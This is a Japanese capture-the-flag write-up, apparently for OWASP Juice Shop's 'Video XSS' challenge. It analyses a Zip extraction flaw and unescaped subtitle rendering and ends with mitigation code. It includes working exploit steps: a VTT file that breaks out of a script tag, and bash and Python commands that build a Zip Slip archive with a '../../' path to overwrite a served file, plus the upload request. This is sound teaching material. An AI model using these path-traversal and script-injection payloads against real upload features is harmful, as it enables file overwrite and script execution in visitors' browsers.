# Video XSS ✅

**難易度:** ⭐⭐⭐⭐⭐⭐
**カテゴリ:** XSS + Zip Slip
**目標:** プロモーション動画に XSS ペイロードを埋め込む

## ソースコード分析

### 脆弱な Zip 展開

**ファイル:** `routes/fileUpload.ts` (lines 27-58)

```typescript
function handleZipFileUpload ({ file }: Request, res: Response, next: NextFunction) {
  if (utils.endsWith(file?.originalname.toLowerCase(), '.zip')) {
    if (((file?.buffer) != null) && utils.isChallengeEnabled(challenges.fileWriteChallenge)) {
      fs.createReadStream(tempFile)
        .pipe(unzipper.Parse())
        .on('entry', function (entry: any) {
          const fileName = entry.path  // Zip 内のパスをそのまま使用
          const absolutePath = path.resolve('uploads/complaints/' + fileName)

          // 脆弱性: パスに現在のディレクトリが含まれていればOK
          if (absolutePath.includes(path.resolve('.'))) {
            entry.pipe(fs.createWriteStream('uploads/complaints/' + fileName))
          }
        })
    }
  }
}
```

### 脆弱な字幕レンダリング

**ファイル:** `routes/videoHandler.ts` (lines 51-78)

```typescript
export const promotionVideo = () => {
  return (req: Request, res: Response) => {
    fs.readFile('views/promotionVideo.pug', function (err, buf) {
      let template = buf.toString()
      const subs = getSubsFromFile()  // VTT ファイルを読み込み

      // チャレンジ検証
      challengeUtils.solveIf(challenges.videoXssChallenge, () => {
        return utils.contains(subs, '</script><script>alert(`xss`)</script>')
      })

      // 脆弱性: 字幕をスクリプトタグにそのまま挿入
      compiledTemplate = compiledTemplate.replace(
        '<script id="subtitle"></script>',
        '<script id="subtitle" type="text/vtt" data-label="English" data-lang="en">'
          + subs  // サニタイズなし
          + '</script>'
      )
      res.send(compiledTemplate)
    })
  }
}

function getSubsFromFile () {
  const subtitles = config.get<string>('application.promotion.subtitles') ?? 'owasp_promo.vtt'
  const data = fs.readFileSync('frontend/dist/frontend/assets/public/videos/' + subtitles, 'utf8')
  return data.toString()
}
```

## 実行手順

### Step 1: 悪意のある VTT ファイルを作成

```
WEBVTT

00:00:00.000 --> 00:00:10.000
</script><script>alert(`xss`)</script>
```

### Step 2: Zip Slip ペイロードを作成

```bash
# ディレクトリ構造を作成
mkdir -p exploit_dir

# VTT ファイルを作成
cat > exploit_dir/owasp_promo.vtt << 'EOF'
WEBVTT

00:00:00.000 --> 00:00:10.000
</script><script>alert(`xss`)</script>
EOF

# Zip を作成（パストラバーサル付き）
cd exploit_dir
zip -r ../exploit.zip ../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt

# または Python で作成
python3 -c "
import zipfile
with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr('../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt', '''WEBVTT

00:00:00.000 --> 00:00:10.000
</script><script>alert(\`xss\`)</script>
''')
"
```

### Step 3: Zip をアップロード

```javascript
// /complain または /file-upload でアップロード
const formData = new FormData();
formData.append('file', zipFile, 'exploit.zip');

fetch('/file-upload', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: formData
});
```

### Step 4: XSS を確認

```javascript
// /promotion にアクセス
window.location.href = '/promotion';
// → XSS アラートが表示される
```

## ターゲットパス

```
frontend/dist/frontend/assets/public/videos/owasp_promo.vtt
```

`/uploads/complaints/` から `../../` で戻る:
```
uploads/complaints/../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt
```

## 解説

### この攻撃は2つの脆弱性を組み合わせている

**日常的な例えで説明すると:**

1. **Zip Slip** = 郵便物を別の住所に届けさせる詐欺
2. **XSS** = その郵便物に爆弾が入っている

### Zip Slip とは？

```
┌─────────────────────────────────────────────────────┐
│              通常の Zip 展開                         │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Zip の中身: image.png                              │
│  展開先: /uploads/complaints/                       │
│  結果: /uploads/complaints/image.png               │
│                                                     │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│              Zip Slip 攻撃                          │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Zip の中身: ../../frontend/videos/owasp_promo.vtt │
│  展開先: /uploads/complaints/                       │
│  結果: /frontend/videos/owasp_promo.vtt            │
│               ↑                                     │
│        本来書けない場所に書き込み!                   │
│                                                     │
└─────────────────────────────────────────────────────┘
```

`../` は「一つ上のディレクトリ」を意味する。これを悪用して、本来の展開先を脱出する。

### なぜ検証を通過するか？

```
開発者の意図: 「/app 内なら安全」
実装: if (path.includes('/app')) { 許可 }

攻撃パス: /app/uploads/../../frontend/videos/file.vtt
          ↓ 正規化後
          /app/frontend/videos/file.vtt

チェック: "/app/frontend/..." は "/app" を含む？ → YES!
結果: 許可されてしまう
```

**問題: 「含む」と「始まる」の違い**

| チェック方法 | `/app/frontend/x` | `/evil/../app/x` |
|-------------|------------------|------------------|
| `includes('/app')` | ✅ 許可 | ✅ 許可（危険!） |
| `startsWith('/app/uploads/')` | ❌ 拒否 | ❌ 拒否（安全） |

### XSS への連鎖

```
┌─────────────────────────────────────────────────────┐
│              VTT ファイル（字幕）の内容              │
├─────────────────────────────────────────────────────┤
│  WEBVTT                                             │
│  00:00:00.000 --> 00:00:10.000                      │
│  </script><script>alert(`xss`)</script>            │
└─────────────────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────┐
│              HTML に埋め込まれた結果                 │
├─────────────────────────────────────────────────────┤
│  <script id="subtitle" type="text/vtt">             │
│  WEBVTT                                             │
│  00:00:00.000 --> 00:00:10.000                      │
│  </script><script>alert(`xss`)</script>            │
│  </script>                                          │
│       ↑                                             │
│   ここで script タグが閉じて、                       │
│   新しい script タグが始まる!                        │
└─────────────────────────────────────────────────────┘
```

### 攻撃の全体像

```
1. 攻撃者: Zip Slip ペイロードを含む Zip をアップロード
           │
           ▼
2. サーバー: 字幕ファイル (owasp_promo.vtt) を上書き
           │
           ▼
3. 被害者: /promotion ページにアクセス
           │
           ▼
4. サーバー: 上書きされた字幕を HTML に埋め込む
           │
           ▼
5. ブラウザ: XSS 実行!
```

### 根本原因

| 脆弱性 | 原因 |
|--------|------|
| Zip Slip | パス検証が「含む」で「始まる」でない |
| XSS | 字幕をエスケープせず HTML に埋め込む |

### 対策

```typescript
// Zip Slip 対策: 正規化後のパスが許可ディレクトリ内か
const safePath = '/app/uploads/complaints/';
if (!absolutePath.startsWith(safePath)) {
  throw new Error('Path traversal detected');
}

// XSS 対策: 出力時にエスケープ
subs = subs.replace(/</g, '&lt;').replace(/>/g, '&gt;');
```

### 対策

```typescript
// 1. パストラバーサルをブロック
if (fileName.includes('..')) {
  throw new Error('Path traversal detected');
}

// 2. 絶対パスの先頭を検証
if (!absolutePath.startsWith(path.resolve('uploads/complaints/'))) {
  throw new Error('Path outside allowed directory');
}

// 3. VTT コンテンツをサニタイズ
subs = subs.replace(/<script/gi, '&lt;script');
```

## 関連ファイル

| ファイル | 説明 |
|---------|------|
| `routes/fileUpload.ts:27-58` | Zip 展開 (脆弱) |
| `routes/videoHandler.ts:51-78` | VTT レンダリング (脆弱) |
| `test/files/videoExploit.zip` | テスト用ペイロード |

## チャレンジ成功条件

```typescript
// VTT に以下が含まれていれば解決
utils.contains(subs, '</script><script>alert(`xss`)</script>')
```

## 関連チャレンジ

- [Arbitrary File Write](arbitrary-file-write.md) - 同じ Zip Slip 脆弱性
- [DOM XSS](../difficulty-1/dom-xss.md)
